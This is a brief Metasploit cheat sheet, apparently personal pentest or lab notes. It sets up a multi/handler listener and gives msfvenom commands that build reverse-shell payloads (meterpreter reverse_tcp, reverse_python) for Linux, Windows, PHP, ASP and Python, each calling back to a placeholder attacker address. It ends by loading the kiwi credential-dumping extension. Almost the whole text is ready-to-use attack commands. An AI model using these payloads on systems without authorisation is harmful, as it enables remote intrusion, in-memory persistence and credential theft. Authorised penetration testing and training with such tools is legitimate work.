# Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target

shell

# setting

msf6 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload php/reverse_php
msf5 exploit(multi/handler) > set lhost 10.0.2.19
msf6 exploit(multi/handler) > set lport 7777
msf6 exploit(multi/handler) > show options

# output executable file on linux

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf

# Windows

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

# PHP

msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

# ASP

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

# Python

msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

# load

load python
load kiwi
